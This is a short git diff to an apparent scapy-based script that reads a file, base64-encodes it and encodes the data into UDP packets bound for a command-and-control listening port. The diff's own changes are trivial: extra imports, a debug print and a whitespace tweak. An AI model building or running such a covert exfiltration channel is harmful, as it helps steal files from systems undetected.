@@ -7,6 +7,9 @@ from scapy.all import sendp
 from scapy.layers.inet import UDP
 from scapy.layers.inet import IP
 from scapy.packet import Raw
+from scapy.packet import ls
+from scapy.all import bytes_hex
+from scapy.layers.inet import Packet
 
 
 def encodePacket(packet, character):
@@ -42,7 +45,7 @@ if __name__ == '__main__':
     listeningPort = int(args.C2_listening_port)
     hostIP = args.host_ip
 
-    print(f"Selected Arguments: {args}")
+    print(args)  # Debugging
     if args.filename is not None:
         file = open(args.filename, 'rb')
         transmissionString = base64.b64encode(file.read())
@@ -57,7 +60,6 @@ if __name__ == '__main__':
 
     encodedPackets = 0
     sentPackets = 0
-
     while encodedPackets < len(transmissionString):
         if packetQ.qsize() > 0:
             pkt = packetQ.get()
